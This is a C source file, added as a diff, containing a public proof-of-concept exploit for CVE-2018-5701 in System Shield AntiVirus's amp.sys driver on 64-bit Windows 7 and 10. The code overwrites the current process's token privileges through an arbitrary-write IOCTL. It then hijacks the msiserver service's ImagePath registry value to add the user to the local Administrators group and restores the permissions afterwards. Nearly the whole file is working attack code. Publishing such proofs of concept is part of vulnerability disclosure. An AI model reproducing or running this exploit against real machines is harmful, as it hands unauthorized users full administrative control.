@@ -1,0 +1,376 @@
+/*
+
+Exploit Title    - System Shield AntiVirus & AntiSpyware Arbitrary Write Privilege Escalation
+Date             - 29th January 2018
+Discovered by    - Parvez Anwar (@parvezghh)
+Vendor Homepage  - http://www.iolo.com/
+Tested Version   - 5.0.0.136
+Driver Version   - 5.4.11.1 - amp.sys
+Tested on OS     - 64bit Windows 7 and Windows 10 (1709) 
+CVE ID           - CVE-2018-5701
+Vendor fix url   - 
+Fixed Version    - 0day
+Fixed driver ver - 0day
+
+
+Check blogpost for details:
+ 
+https://www.greyhathacker.net/?p=1006
+ 
+*/
+
+
+#include <stdio.h>
+#include <windows.h>
+#include <aclapi.h>
+
+#pragma comment(lib,"advapi32.lib")
+
+#define MSIEXECKEY "MACHINE\\SYSTEM\\CurrentControlSet\\services\\msiserver"
+
+#define SystemHandleInformation 16
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
+
+
+typedef unsigned __int64 QWORD;
+
+
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
+{
+     ULONG       ProcessId;
+     UCHAR       ObjectTypeNumber;
+     UCHAR       Flags;
+     USHORT      Handle;
+     QWORD       Object;
+     ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
+
+
+typedef struct _SYSTEM_HANDLE_INFORMATION 
+{
+     ULONG NumberOfHandles;
+     SYSTEM_HANDLE Handles[1];
+} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
+
+
+typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
+     ULONG SystemInformationClass,
+     PVOID SystemInformation,
+     ULONG SystemInformationLength,
+     PULONG ReturnLength);
+
+
+
+
+QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID) 
+{
+    _NtQuerySystemInformation   NtQuerySystemInformation;
+    PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo; 
+    ULONG                       i;
+    PSYSTEM_HANDLE              pHandle;
+    QWORD                       TokenAddress = 0;       
+    DWORD                       nSize = 4096;
+    DWORD                       nReturn; 
+    BOOL                        tProcess;    
+    HANDLE                      hToken;
+
+
+    if ((tProcess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) == FALSE)
+    {
+        printf("\n[-] OpenProcessToken() failed (%d)\n", GetLastError());
+        return -1;
+    }
+
+    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
+ 	
+    if (!NtQuerySystemInformation)
+    {
+        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
+        return -1;  
+    }
+
+    do
+    {  
+        nSize += 4096;
+        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION) HeapAlloc(GetProcessHeap(), 0, nSize); 
+    } while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH);
+	
+    printf("\n[i] Current process id %d and token handle value %u", MyProcessID, hToken);	
+
+    for (i = 0; i < pSysHandleInfo->NumberOfHandles; i++) 
+    {
+
+        if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle == hToken) 
+        {
+            TokenAddress = pSysHandleInfo->Handles[i].Object;	     			  
+        }
+    }
+
+    HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
+    return TokenAddress;	
+}
+
+
+
+int TakeOwnership()
+{
+     HANDLE           token;
+     PTOKEN_USER      user = NULL;
+     PACL             pACL = NULL;
+     EXPLICIT_ACCESS  ea;   
+     DWORD            dwLengthNeeded;
+
+
+
+     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token))
+     {	
+         printf("\n[-] OpenProcessToken failed %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] OpenProcessToken successful");
+
+     if (!GetTokenInformation(token, TokenUser, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+     {
+         printf("\n[-] Failed to initialize GetTokenInformation %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+
+     user = (PTOKEN_USER)LocalAlloc(0, dwLengthNeeded);
+
+     if (!GetTokenInformation(token, TokenUser, user, dwLengthNeeded, &dwLengthNeeded))
+     {
+         printf("\n[-] GetTokenInformation failed %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+ 
+     ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
+
+// build DACL
+
+     ea.grfAccessPermissions = KEY_ALL_ACCESS;
+     ea.grfAccessMode = GRANT_ACCESS;
+     ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
+     ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+     ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
+     ea.Trustee.ptstrName = (LPTSTR)user->User.Sid; 
+
+     if (SetEntriesInAcl(1, &ea, NULL, &pACL) != ERROR_SUCCESS)
+     {
+         printf("\n[-] SetEntriesInAcl failure\n\n");
+         ExitProcess(1);
+     }    
+     printf("\n[+] SetEntriesInAcl successful");
+
+// Take ownership
+	
+     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, user->User.Sid, NULL, NULL, NULL) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Failed to obtain the object's ownership %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] Ownership '%s' successful", MSIEXECKEY);
+
+// Modify DACL
+
+     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Failed to modify the object's DACL %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] Object's DACL successfully modified");
+
+     LocalFree(pACL);
+     CloseHandle(token);
+ 
+     return 0;
+}
+
+
+
+int RestorePermissions()
+{
+     PACL             pOldDACL = NULL;
+     PSID             pSIDAdmin = NULL;
+     SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
+
+ 
+
+     printf("\n[*] Restoring all permissions and value");
+
+// Restore registry value
+
+     WriteToRegistry("%systemroot%\\system32\\msiexec.exe /V"); 
+
+// Sid for the BUILTIN\Administrators group
+
+     if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,  &pSIDAdmin)) 
+     {
+         printf("\nAllocateAndInitializeSid failed %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+
+// Restore key ownership
+	
+     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Failed to restore the object's ownership %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] Object's ownership successfully restored");
+
+// Take copy of parent key
+
+     if (GetNamedSecurityInfo("MACHINE\\SYSTEM\\CurrentControlSet\\Services", SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, NULL) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Failed to copy parent key object's DACL %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] Parent key object's DACL successfully saved");
+
+// Restore key permissions
+
+     if (SetNamedSecurityInfo(MSIEXECKEY, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION | UNPROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pOldDACL, NULL) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Failed to restore the object's DACL %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] Object's DACL successfully restored");
+
+     FreeSid(pSIDAdmin); 
+
+     return 0;
+}
+
+
+
+int WriteToRegistry(char command[])
+{
+     HKEY hkeyhandle;
+ 
+     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\services\\msiserver", 0, KEY_WRITE, &hkeyhandle) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Registry key failed to open %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+
+     if (RegSetValueEx(hkeyhandle, "ImagePath", 0, REG_EXPAND_SZ, (LPBYTE) command, strlen(command)) != ERROR_SUCCESS)
+     {
+         printf("\n[-] Registry value failed to write %d\n\n", GetLastError());
+         ExitProcess(1);
+     }
+
+     printf("\n[+] Registry key opened and value modified");
+
+     RegCloseKey(hkeyhandle);
+
+     return 0;
+}
+
+
+
+int TriggerCommand()
+{
+     STARTUPINFO           si;
+     PROCESS_INFORMATION   pi;
+
+
+     ZeroMemory(&si, sizeof(si));
+     ZeroMemory(&pi, sizeof(pi));
+     si.cb = sizeof(si);
+
+     if (!CreateProcess(NULL, "c:\\windows\\system32\\msiexec.exe /i poc.msi /quiet", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+     {
+         printf("\n[-] CreateProcess failed %d", GetLastError());
+         ExitProcess(1);
+     }
+     printf("\n[+] c:\\windows\\system32\\msiexec.exe launched");
+     printf("\n[i] Account should now be in the local administrators group");
+
+     CloseHandle(pi.hThread);
+     CloseHandle(pi.hProcess);
+    
+     return 0;
+}
+
+
+
+int main(int argc, char *argv[]) 
+{
+    QWORD      TokenAddressTarget; 
+    QWORD      SepPrivilegesOffset = 0x40;
+    QWORD      TokenAddress;
+    HANDLE     hDevice;
+    char       devhandle[MAX_PATH];
+    DWORD      dwRetBytes = 0;  
+    QWORD      inbuffer1[3] = {0};   
+    QWORD      inbuffer2[3] = {0};      
+    QWORD      ptrbuffer[1] = {0};           // QWORD4 - Has to be 0 for arbitrary write value to be 0xfffffffe   
+    DWORD      currentusersize;
+    char       currentuser[100];
+    char       netcommand[MAX_PATH];            
+
+
+
+    printf("-------------------------------------------------------------------------------\n");
+    printf("  System Shield AntiVirus & AntiSpyware (amp.sys) Arbitrary Write EoP Exploit  \n");
+    printf("                 Tested on 64bit Windows 7 / Windows 10 (1709)                 \n");
+    printf("-------------------------------------------------------------------------------\n");
+
+    TokenAddress = TokenAddressCurrentProcess(GetCurrentProcess(), GetCurrentProcessId());
+    printf("\n[i] Address of current process token 0x%p", TokenAddress);
+
+    TokenAddressTarget = TokenAddress + SepPrivilegesOffset;
+    printf("\n[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten", TokenAddressTarget);
+ 
+    inbuffer1[0] = 0x8;                      // QWORD1 - Cannot be more than 8. Also different values (<9) calculates to different sub calls
+    inbuffer1[1] = ptrbuffer;                // QWORD2 - Address used for read and write
+    inbuffer1[2] = TokenAddressTarget+1;     // QWORD3 - Arbitrary write address !!!
+
+    inbuffer2[0] = 0x8;
+    inbuffer2[1] = ptrbuffer;
+    inbuffer2[2] = TokenAddressTarget+9;
+
+    sprintf(devhandle, "\\\\.\\%s", "amp");
+
+    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+    
+    if(hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("\n[-] Open %s device failed\n\n", devhandle);
+        return -1;
+    }
+    else 
+    {
+        printf("\n[+] Open %s device successful", devhandle);
+    }	
+
+    printf("\n[~] Press any key to continue . . .\n");
+    getch();
+
+    DeviceIoControl(hDevice, 0x00226003, inbuffer1, sizeof(inbuffer1), NULL, 0, &dwRetBytes, NULL); 
+    DeviceIoControl(hDevice, 0x00226003, inbuffer2, sizeof(inbuffer2), NULL, 0, &dwRetBytes, NULL); 
+
+    printf("[+] Overwritten _SEP_TOKEN_PRIVILEGES bits\n");
+    CloseHandle(hDevice);
+    
+    currentusersize = sizeof(currentuser);
+
+    if (!GetUserName(currentuser, &currentusersize))
+    {
+        printf("\n[-] Failed to obtain current username: %d\n\n", GetLastError());
+        return -1;
+    }
+
+    printf("[*] Adding current user '%s' account to the local administrators group", currentuser);
+
+    sprintf(netcommand, "net localgroup Administrators %s /add", currentuser);
+
+    TakeOwnership();  
+    WriteToRegistry(netcommand);  
+    TriggerCommand();
+    Sleep(1000);
+    RestorePermissions(); 
+    printf("\n\n");
+
+    return 0;
+}
